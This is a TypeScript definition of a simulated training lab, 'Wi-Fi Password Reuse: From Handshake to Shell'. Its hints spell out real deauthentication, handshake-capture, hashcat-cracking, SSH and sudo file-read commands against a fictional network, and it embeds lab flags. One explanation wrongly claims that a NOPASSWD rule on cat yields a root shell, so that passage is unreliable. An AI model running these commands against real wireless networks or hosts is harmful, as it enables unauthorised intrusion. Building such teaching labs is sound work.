import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

/** Wireless capture-and-crack chained into a SECOND host via WiFi/host password reuse — a
 *  genuinely common real-world finding (the office WiFi password IS the shared local-admin
 *  password) that this platform's existing wireless labs (wireless-pack.ts, capstone-wireless-pack.ts)
 *  stop short of: they end at the cracked plaintext, this one spends it. */
export const wirelessPasswordReuseLab: LabScenario = {
  id: 'wireless-password-reuse-handshake-to-shell',
  title: 'Wi-Fi Password Reuse: From Handshake to Shell',
  difficulty: 'Medium',
  category: 'Wireless',
  briefing:
    "Meridian Timber's branch office WiFi is your entry point. Capture the WPA2 handshake for their " +
    "access point, crack it offline, and see how far that one password actually gets you — branch IT " +
    "has a well-documented habit of reusing the WiFi passphrase as a local admin password on branch " +
    "hardware. Land a shell on their file server and find out what a misconfigured sudo rule leaves lying around.",
  objectives: [
    { text: 'Put your wireless interface into monitor mode with airmon-ng', why: 'A normal (managed-mode) WiFi interface can only associate with one network at a time and cannot capture other traffic — monitor mode lets the card see every 802.11 frame in the air, which handshake capture requires.' },
    { text: 'Scan for nearby networks with airodump-ng and identify the target BSSID', why: 'The BSSID (the AP\'s own MAC address) — not the SSID text — is what every other wireless tool actually targets, since two networks can share a display name.' },
    { text: 'Send deauthentication frames with aireplay-ng to force a client to reassociate', why: 'A WPA2 handshake only happens when a client JOINS the network — deauthing an already-connected client forces it to reconnect, producing a fresh handshake to capture without waiting for one to happen naturally.' },
    { text: 'Capture the resulting handshake with airodump-ng, targeting the BSSID and writing to a file', why: 'The 4-way handshake contains everything needed to verify a password guess offline — once captured, the AP itself is no longer needed at all for the cracking step.' },
    { text: 'Crack the captured handshake offline with hashcat against a wordlist', why: 'WPA2-PSK cracking is always a dictionary/brute-force attack against the captured handshake — there is no protocol flaw being exploited, just an offline guess-and-check against material that never has to touch the network again.' },
    { text: 'SSH into the branch file server using the recovered password', why: "Branch IT reused the WiFi passphrase as this box's local admin password — a single cracked password just became a foothold on an actual host, not just \"free WiFi.\"" },
    { text: 'Enter the recovered password at the SSH prompt', why: 'The password IS the payload here — everything upstream (capture, crack) existed purely to produce this one string.' },
    { text: 'Check your sudo privileges with sudo -l', why: 'Before trying anything blind, always check what you\'re actually allowed to run as root first — a NOPASSWD rule is a documented, intentional (if misconfigured) escalation path, not a bug you have to discover by trial and error.' },
    { text: 'Use the misconfigured sudo rule to escalate to root', why: 'A NOPASSWD rule on a binary like cat is a classic GTFOBins-style misconfiguration — sudo grants a root shell the instant the rule matches, regardless of what the command line actually was.' },
    { text: 'Read the root flag with an ABSOLUTE path', why: "Escalating via sudo does not change your working directory — you're root, but still sitting wherever your shell already was, so the flag file needs its full path, not a relative one." },
  ],
  hints: [
    'airmon-ng start wlan0',
    'airodump-ng wlan0mon',
    'aireplay-ng --deauth 5 -a 04:9A:2C:8E:1B:60 wlan0mon',
    'airodump-ng --bssid 04:9A:2C:8E:1B:60 -c 6 -w capture wlan0mon',
    'hashcat -m 22000 capture-01.hc22000 /usr/share/wordlists/rockyou.txt',
    'ssh nasadmin@10.70.5.20',
    'branch2024wifi',
    'sudo -l',
    'sudo cat /root/root_flag.txt',
    'cat /root/root_flag.txt',
  ],
  totalFlags: 2,
  attacker: {
    hostname: 'kali',
    user: 'root',
    root: dir({
      usr: dir({
        share: dir({
          wordlists: dir({
            'rockyou.txt': file(
              'password\n123456\nletmein\nsunshine\nqwerty123\nbranch2024wifi\ntimber2023\nfootball1\ndragon99\ntrustno1\n'
            ),
          }),
        }),
      }),
    }),
  },
  network: [
    {
      hostname: 'branch-ap',
      ip: '10.70.5.10',
      os: 'n/a (wireless access point)',
      services: [],
      users: [],
      root: dir({}),
      wifiNetwork: {
        ssid: 'MeridianTimber-Branch',
        bssid: '04:9A:2C:8E:1B:60',
        channel: 6,
        encryption: 'WPA2',
        captureFile:
          '#HASHCAT_HASH:22000*02*9f1a3c7e2d8b4056c1e9f3a7b5d4c082*049a2c8e1b60*b8c3f0e29d1a*4272616e6368\n' +
          '#HASHCAT_PLAINTEXT:branch2024wifi\n' +
          '#HASHCAT_FLAG:flag{wpa2_handshake_deauth_capture_offline_crack}\n',
      },
    },
    {
      hostname: 'branch-nas',
      ip: '10.70.5.20',
      os: 'Linux (Ubuntu 20.04, branch file server)',
      services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.2p1' }],
      users: [
        {
          username: 'nasadmin',
          password: 'branch2024wifi',
          sudo: { nopasswdCommands: ['/usr/bin/cat'] },
        },
      ],
      root: dir({
        home: dir({ nasadmin: dir({ 'notes.txt': file('TODO: stop reusing the WiFi password for local admin accounts. -- IT\n') }) }),
        root: dir({ 'root_flag.txt': file('Password reuse strikes again.\nflag{wifi_password_reused_as_local_admin_sudo_gtfobins}\n') }),
      }),
    },
  ],
};
